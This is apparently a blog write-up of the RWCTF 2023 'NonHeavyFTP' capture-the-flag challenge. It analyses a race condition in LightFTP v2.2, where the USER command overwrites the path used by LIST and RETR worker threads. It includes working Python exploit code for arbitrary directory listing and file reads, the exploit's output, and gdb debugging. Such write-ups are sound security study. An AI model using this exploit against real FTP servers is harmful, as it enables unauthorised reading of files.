---
layout: post
title: RWCTF 2023 NonHeavyFTP writeup
date: 2023-01-09
Author: f1tao
tags: [ctf]
comments: true
toc: true
---

A FTP Server pwn chanllenge.

## Description

The description of the challenge is shown as below:

```bash
NonHeavyFTP
Score: 167
Clone-and-Pwn, difficulty:Baby

A non-heavy FTP for you.

# primary
$ nc 47.89.253.219 2121
# backup
$ nc 47.89.253.219 2221
```

Download the [attachment](https://github.com/f1tao/CTF/blob/main/RWCTF-2023/NonHeavyFTP/NonHeavyFTP.zip) of the chanllenge.

```bash
$ ls
Dockerfile fftp       fftp.conf
```

From the `Dockfile`, we can see that the chanllenge is a open source FTP Server, which is [LightFTP v2.2](https://github.com/hfiref0x/LightFTP/releases/tag/v2.2).

```bash
...
wget --no-check-certificate https://codeload.github.com/hfiref0x/LightFTP/zip/refs/tags/v2.2 -O LightFTP-2.2.zip
```

So what we need to do is that download the source code and review the code to find the vulnerability.

The `fftp.conf` shows that the listen port is `2121`, and the user name is `anonymous`, the password is `*`， and the access right of the user is `readonly`.

```ini
[ftpconfig]
port=2121
maxusers=10000000
interface=0.0.0.0
local_mask=255.255.255.255

minport=30000
maxport=60000

goodbyemsg=Goodbye!
keepalive=1

[anonymous]
pswd=*
accs=readonly
root=/server/data/
```

## Analysis

First of all, let me give you a overview of the code flow for the server. The simple FTP server handles all the client connections in a thread named `ftpmain`. As shown in below, when a new client comes, it will create the `ftp_client_thread` thread to handle the connection.

```c
    // Source/ftpserv.c: 1908
		socketret = listen(ftpsocket, SOMAXCONN);
    while ( socketret == 0 ) {
        memset(&laddr, 0, sizeof(laddr));
        asz = sizeof(laddr);
        clientsocket = accept(ftpsocket, (struct sockaddr *)&laddr, &asz);
        if (clientsocket == INVALID_SOCKET)
            continue;

        rv = -1;
        for (i=0; i<g_cfg.MaxUsers; i++)
            if ( scb[i] == INVALID_SOCKET ) {

                if (g_cfg.EnableKeepalive != 0)
                    socket_set_keepalive(clientsocket);

                scb[i] = clientsocket;
                rv = pthread_create(&th, NULL, (void * (*)(void *))ftp_client_thread, &scb[i]);
                if ( rv != 0 )
                    scb[i] = INVALID_SOCKET;

                break;
            }
```

In the handle routine of the `ftp_client_thread`, it will recieve the command from the client, and find the corresponding handle function for the comand.

```c
        // Source/ftpserv.c: 1781
				while ( ctx.ControlSocket != INVALID_SOCKET ) {
            if ( !recvcmd(&ctx, rcvbuf, sizeof(rcvbuf)) )
                break;

            ...
            for (c=0; c<MAX_CMDS; c++)
                if (strncasecmp(cmd, ftpprocs[c].Name, cmdlen) == 0)
                {
                    cmdno = c;
                    rv = ftpprocs[c].Proc(&ctx, params);
                    break;
                }
```

The command handle table `ftpprocs` is shown as below, each command has the corresponding function. From here we can know, what we need to do is that check all the command functions and find the vulnerability to read the `flag`.

```c
static const FTPROUTINE_ENTRY ftpprocs[MAX_CMDS] = {
        {"USER", ftpUSER}, {"QUIT", ftpQUIT}, {"NOOP", ftpNOOP}, {"PWD",  ftpPWD },
        {"TYPE", ftpTYPE}, {"PORT", ftpPORT}, {"LIST", ftpLIST}, {"CDUP", ftpCDUP},
        {"CWD",  ftpCWD }, {"RETR", ftpRETR}, {"ABOR", ftpABOR}, {"DELE", ftpDELE},
        {"PASV", ftpPASV}, {"PASS", ftpPASS}, {"REST", ftpREST}, {"SIZE", ftpSIZE},
        {"MKD",  ftpMKD }, {"RMD",  ftpRMD }, {"STOR", ftpSTOR}, {"SYST", ftpSYST},
        {"FEAT", ftpFEAT}, {"APPE", ftpAPPE}, {"RNFR", ftpRNFR}, {"RNTO", ftpRNTO},
        {"OPTS", ftpOPTS}, {"MLSD", ftpMLSD}, {"AUTH", ftpAUTH}, {"PBSZ", ftpPBSZ},
        {"PROT", ftpPROT}, {"EPSV", ftpEPSV}, {"HELP", ftpHELP}, {"SITE", ftpSITE}
};
```

After reading all the code, i found the vulnerability is a rece condition with the usage of the `context->FileName` variable. 

For example, in the `LIST` command function `ftpLIST`, it will first call the `ftp_effective_path` to validate the target directory path, which is no problem. 

```c
// Source/ftpserv.c: 541
int ftpLIST(PFTPCONTEXT context, const char *params)
{
  	...
		ftp_effective_path(context->RootDir, context->CurrentDir, params, sizeof(context->FileName), context->FileName);

    while (stat(context->FileName, &filestats) == 0)
    {
        if ( !S_ISDIR(filestats.st_mode) )
            break;

        sendstring(context, interm150);
        writelogentry(context, " LIST", (char *)params);
        context->WorkerThreadAbort = 0;

        pthread_mutex_lock(&context->MTLock);

        context->WorkerThreadValid = pthread_create(&tid, NULL, (void * (*)(void *))list_thread, context);
```

The problem is that the path is stored in `context->FileName` variable, and after the validation, it creates a thread `list_thread` to list the file.

As we know about the ftp protocal, when a server is in `passive` mode, data will be transported with a new socket. As the function `create_datasocket` shows, the thread will be stucked in the `accept` function and wait for the client to connect. When the client comes to connect, it will then read the file directory for the `context->FileName`. 

```c
// Source/ftpserv.c: 484
void *list_thread(PFTPCONTEXT context)
{
    ...
    clientsocket = create_datasocket(context);
    while (clientsocket != INVALID_SOCKET)
    {
        if (context->TLS_session != NULL)
            if (!ftp_init_tls_session(&TLS_datasession, clientsocket, 0))
                break;

        pdir = opendir(context->FileName);
        if (pdir == NULL)
            break;

        while ((entry = readdir(pdir)) != NULL) {
            ret = list_sub(context->FileName, clientsocket, TLS_datasession, entry);
            if ( (ret == 0) || (context->WorkerThreadAbort != 0 ))
                break;
        }

        closedir(pdir);
        break;
    }

// Source ftpserv.c: 101
SOCKET create_datasocket(PFTPCONTEXT context)
{
    ...

    switch ( context->Mode ) {
    case MODE_NORMAL:
        ...
        break;

    case MODE_PASSIVE:
        asz = sizeof(laddr);
        clientsocket = accept(context->DataSocket, (struct sockaddr *)&laddr, &asz);
        close(context->DataSocket);
        context->DataSocket = clientsocket;

        if ( clientsocket == INVALID_SOCKET )
            return INVALID_SOCKET;

        context->DataIPv4 = 0;
        context->DataPort = 0;
        context->Mode = MODE_NORMAL;
        break;
```

It seems no problem in the `list_thread` function, but what if we change the value of `context->FileName` during the the block of the list thread, and then connect to the port to receive the file directory. Isn't means that the thread will read the directory we put to the `context->FileName`. The answer is yes, we can change the  `context->FileName` with the function `ftpUSER`. So this is a race condition vulnerability.

```c
// Source/ftpserv.c: 253
int ftpUSER(PFTPCONTEXT context, const char *params)
{
    if ( params == NULL )
        return sendstring(context, error501);

    context->Access = FTP_ACCESS_NOT_LOGGED_IN;

    writelogentry(context, " USER: ", (char *)params);
    snprintf(context->FileName, sizeof(context->FileName), "331 User %s OK. Password required\r\n", params);
    sendstring(context, context->FileName);

    /* Save login name to FileName for the next PASS command */
    strcpy(context->FileName, params);
    return 1;
}
```

we can make use of this vulnerability to a arbitrary directory traversal vulnerability, the poc is shown as below:

```python
def list_dir(path):
    p = remote(ip, port)
    p.recvuntil(b"ready\r\n")
    # step 1 login
    buf = b"USER anonymous"
    sl(p, buf)
    p.recvuntil(b"required\r\n")
    buf = b"PASS *"
    sl(p, buf)
    # step 2, go into passive mode, and get the data port
    p.recvuntil(b"proceed.\r\n")
    buf = b"EPSV"
    sl(p, buf)
    p.recvuntil(b"|||")
    r_port = p.recvuntil(b"|")[:-1].decode()
    print(f"list remote port: {r_port}")
    
    # step 3, trigger the race condition vulnerability in list function
    buf = b"LIST /"
    sl(p, buf)
    time.sleep(1)
    buf = f"USER {path}".encode()  # overwirte the value of context->FilenNme during the block of list thread.
    sl(p, buf)
    p_dir = remote(ip, r_port);
    dir_data = p_dir.recvall().decode() # connect to the data port to read data
    p_dir.close()
    p.close()
    return dir_data
```

The same with `RETR` command, there is also a race condition vulnerability in the `ftpRETR` function, we can make use of it to a arbitrary file read vulnerablity.

## Exploit

If you know the race condition vulnerability, then the exploit is easy. First use the arbitrary directory traversal vulnerability to get the `/` path file list. From the list we can get the name of the flag. Second use the arbitrary file read vulnerablity read the data of the flag. Boom, pwned.

the exp is shown as below:

```python
if __name__=='__main__':
    dir_data = list_dir("/")
    flag_idx = dir_data.find("flag.")
    flag_path = "/"+dir_data[flag_idx:flag_idx+41]
    print(f"flag path: {flag_path}")
    flag_data = read_file(flag_path)
    print(f"flag: {flag_data}")
```

The running result is shown as below:

```bash
$ python exp.py
[+] Opening connection to 47.89.253.219 on port 2121: Done
list remote port: 41092
[+] Opening connection to 47.89.253.219 on port 41092: Done
[+] Receiving all data: Done (1018B)
[*] Closed connection to 47.89.253.219 port 41092
[*] Closed connection to 47.89.253.219 port 2121
flag path: /flag.deb10154-8cb2-11ed-be49-0242ac110002
[+] Opening connection to 47.89.253.219 on port 2121: Done
retr remote port: 42644
[+] Opening connection to 47.89.253.219 on port 42644: Done
[+] Receiving all data: Done (48B)
[*] Closed connection to 47.89.253.219 port 42644
[*] Closed connection to 47.89.253.219 port 2121
flag: rwctf{race-c0nd1tion-1s-real1y_ha4d_pr0blem!!!}
```

The full exp is in my [github](https://github.com/f1tao/CTF/tree/main/RWCTF-2023/NonHeavyFTP).

## Debug

In this section, i'll try to debug the vulnerability in gdb to get a deeper understanding of race condition vulnerability and multiple thread debugging.

To debug the server conveniently, we can compile the debug version of the ftp server instead of release version as the dockerfile shows. The commands to compile the debug version are shown as below:

```bash
sudo apt-get install -y --no-install-recommends wget unzip gcc make libc6-dev gnutls-dev uuid
cd LightFTP-2.2/Source/Debug
make
```

Run gdb with the `fftp` binary, and debug with the `fftp.conf`.

```bash
gdb fftp
run fftp.conf
```

After sending `LIST /` the command, break gdb and start to debug.  At this moment, the `list_thread` will stuck at the `create_datasocket` function.

As shown below, the `4th` thread is stucked at `__libc_accept`, debug the thread and run with the command `thread 4`, and `bt` to check the stack, we can see it's in the `create_datasocket` function, and the context address is `0x7ffff4926ba0`.

```bash
pwndbg> info thread
  Id   Target Id                                Frame
* 1    Thread 0x7ffff7755940 (LWP 91609) "fftp" __GI___libc_read (nbytes=1024, buf=0x555555595770, fd=0) at ../sysdeps/unix/sysv/linux/read.c:26
  2    Thread 0x7ffff7754640 (LWP 91612) "fftp" 0x00007ffff7cbe60f in __libc_accept (fd=3, addr=..., len=0x7ffff7753c0c) at ../sysdeps/unix/sysv/linux/accept.c:26
  3    Thread 0x7ffff492d640 (LWP 91678) "fftp" __libc_recv (flags=<optimized out>, len=4095, buf=0x7ffff492bc40, fd=4) at ../sysdeps/unix/sysv/linux/recv.c:28
  4    Thread 0x7fffeffff640 (LWP 91679) "fftp" 0x00007ffff7cbe60f in __libc_accept (fd=6, addr=..., len=0x7fffefffeb58) at ../sysdeps/unix/sysv/linux/accept.c:26
  
pwndbg> thread 4
...
pwndbg> bt
#0  0x00007ffff7cbe60f in __libc_accept (fd=6, addr=..., len=0x7fffefffeb58) at ../sysdeps/unix/sysv/linux/accept.c:26
#1  0x0000555555558a4c in create_datasocket (context=0x7ffff4926ba0) at ../ftpserv.c:127
#2  0x00005555555599f1 in list_thread (context=0x7ffff4926ba0) at ../ftpserv.c:497
#3  0x00007ffff7c2bb43 in start_thread (arg=<optimized out>) at ./nptl/pthread_create.c:442
#4  0x00007ffff7cbda00 in clone3 () at ../sysdeps/unix/sysv/linux/x86_64/clone3.S:81
```

The `context->FileName`  is at the offset of `0x3078` of `context`, so let's check the value of `context->FileName`, we can see it's still `/server/data` now.

```bash
pwndbg> x/s 0x7ffff4926ba0+0x3078
0x7ffff4929c18: "/server/data"
```

And then send out the overwirte command `USER /`, check the value again,  we can see it has been changed to `/`, boom, pwned.

```bash
pwndbg> x/s 0x7ffff4926ba0+0x3078                                                                             
0x7ffff4929c18: "/"
```

## Conclusion

Fun game, learned a lot from the game.